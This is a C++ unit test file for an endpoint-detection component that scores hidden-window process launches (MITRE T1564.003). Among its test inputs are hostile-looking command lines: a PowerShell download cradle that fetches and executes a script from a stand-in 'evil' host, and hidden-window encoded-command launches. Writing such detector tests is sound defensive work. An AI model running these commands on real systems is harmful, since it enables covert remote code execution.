/*
 * hidden_window_detector_tests.cpp - Unit tests for HiddenWindowDetector
 * (T1564.003 Hidden Window).
 */
#include "hidden_window_detector_tests.h"

#include <cstdint>
#include <cstdio>
#include <stdexcept>
#include <string>

#include "edr_event.h"
#include "event_bus.h"
#include "hidden_window_detector.h"

namespace {

#define HW_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "hidden window detector test failed at line " +
            std::to_string(line) + ": " + expression);
}

edr::Event ProcEvent(uint64_t ts100ns, const char* image,
                     const char* commandLine) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kImage] = image;
    if (commandLine != nullptr)
        event.fields[edr::field::kCommandLine] = commandLine;
    return event;
}

edr::Event ScriptEvent(uint64_t ts100ns, const char* scriptText) {
    edr::Event event;
    event.type = EDR_EVT_POWERSHELL_SCRIPT;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "PS_SCRIPT";
    /* House contract: the PS script body lives ONLY in
     * kScriptBlockText, never kCommandLine. */
    event.fields[edr::field::kScriptBlockText] = scriptText;
    return event;
}

std::string Score(const edr::Event& event) {
    auto it = event.fields.find(edr::field::kHiddenWindowScore);
    return it == event.fields.end() ? "" : it->second;
}

constexpr uint64_t kSecond = 10000000ULL;

} // namespace

void RunHiddenWindowDetectorTests() {
    std::fprintf(stderr, "[hidden-window] TestDisabled\n");
    {
        edr::HiddenWindowDetector detector(false, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell -WindowStyle Hidden -enc AAAA");
        detector.Enrich(event);
        HW_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[hidden-window] TestHiddenPlusPayload\n");
    {
        edr::HiddenWindowDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1001 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -WindowStyle Hidden -enc AAAABBBB");
        detector.Enrich(event);
        HW_CHECK(Score(event) == "90");
        HW_CHECK(event.fields.at(
            edr::field::kHiddenWindowVerdict) == "malicious");
    }
    std::fprintf(stderr, "[hidden-window] TestHiddenDownloadCradle\n");
    {
        edr::HiddenWindowDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1002 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell -w hidden -c \"IEX(New-Object Net.WebClient)."
            "DownloadString('http://evil/x.ps1')\"");
        detector.Enrich(event);
        HW_CHECK(Score(event) == "90");
    }
    std::fprintf(stderr, "[hidden-window] TestBareHiddenStyle\n");
    {
        edr::HiddenWindowDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1003 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell -WindowStyle Hidden -File script.ps1");
        detector.Enrich(event);
        HW_CHECK(Score(event) == "85");
    }
    std::fprintf(stderr, "[hidden-window] TestCreateNoWindow\n");
    {
        edr::HiddenWindowDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1004 * kSecond, "C:\\Windows\\System32\\cmd.exe",
            "cmd /c setup.exe -CreateNoWindow");
        detector.Enrich(event);
        HW_CHECK(Score(event) == "85");
    }
    std::fprintf(stderr, "[hidden-window] TestStartMinPayload\n");
    {
        edr::HiddenWindowDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1005 * kSecond, "C:\\Windows\\System32\\cmd.exe",
            "cmd /c start /min powershell -enc AAA");
        detector.Enrich(event);
        HW_CHECK(Score(event) == "80");
    }
    std::fprintf(stderr, "[hidden-window] TestStartMinBare\n");
    {
        edr::HiddenWindowDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1006 * kSecond, "C:\\Windows\\System32\\cmd.exe",
            "cmd /c start /min notepad.exe");
        detector.Enrich(event);
        HW_CHECK(Score(event) == "75");
    }
    std::fprintf(stderr, "[hidden-window] TestVisibleStyleSilent\n");
    {
        /* Visible styles (Minimized/Normal/Maximized) are legitimate UI
         * usage and must stay silent -- only Hidden conceals. */
        edr::HiddenWindowDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1007 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell -WindowStyle Minimized -File report.ps1");
        detector.Enrich(event);
        HW_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[hidden-window] TestHelpQuerySilent\n");
    {
        edr::HiddenWindowDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1008 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell Get-Help about_WindowStyle /?");
        detector.Enrich(event);
        HW_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[hidden-window] TestUnrelatedSilent\n");
    {
        edr::HiddenWindowDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1009 * kSecond, "C:\\Windows\\System32\\notepad.exe",
            "notepad.exe C:\\docs\\readme.txt");
        detector.Enrich(event);
        HW_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[hidden-window] TestPowerShellPlane\n");
    {
        edr::HiddenWindowDetector detector(true, 55, 300, 1024);
        edr::Event event = ScriptEvent(
            1010 * kSecond,
            "Start-Process calc -WindowStyle Hidden");
        detector.Enrich(event);
        HW_CHECK(Score(event) == "85");
    }
    std::fprintf(stderr, "[hidden-window] TestPowerShellNoBodySilent\n");
    {
        edr::HiddenWindowDetector detector(true, 55, 300, 1024);
        edr::Event event = ScriptEvent(1011 * kSecond, "");
        detector.Enrich(event);
        HW_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[hidden-window] TestMinScoreGate\n");
    {
        edr::HiddenWindowDetector detector(true, 80, 300, 1024);
        edr::Event event = ProcEvent(
            1012 * kSecond, "C:\\Windows\\System32\\cmd.exe",
            "cmd /c start /min notepad.exe");
        detector.Enrich(event);
        HW_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[hidden-window] TestDedupWindow\n");
    {
        edr::HiddenWindowDetector detector(true, 55, 300, 1024);
        const char* cmd =
            "powershell -WindowStyle Hidden -enc AAAABBBB";
        edr::Event first = ProcEvent(2000 * kSecond,
                                     "C:\\Windows\\System32\\powershell.exe",
                                     cmd);
        detector.Enrich(first);
        HW_CHECK(Score(first) == "90");

        edr::Event dup = ProcEvent(2001 * kSecond,
                                   "C:\\Windows\\System32\\powershell.exe",
                                   cmd);
        detector.Enrich(dup);
        HW_CHECK(Score(dup).empty());

        edr::Event later = ProcEvent(
            (2000 + 400) * kSecond,
            "C:\\Windows\\System32\\powershell.exe", cmd);
        detector.Enrich(later);
        HW_CHECK(Score(later) == "90");
    }
    std::fprintf(stderr, "[hidden-window] all passed\n");
}
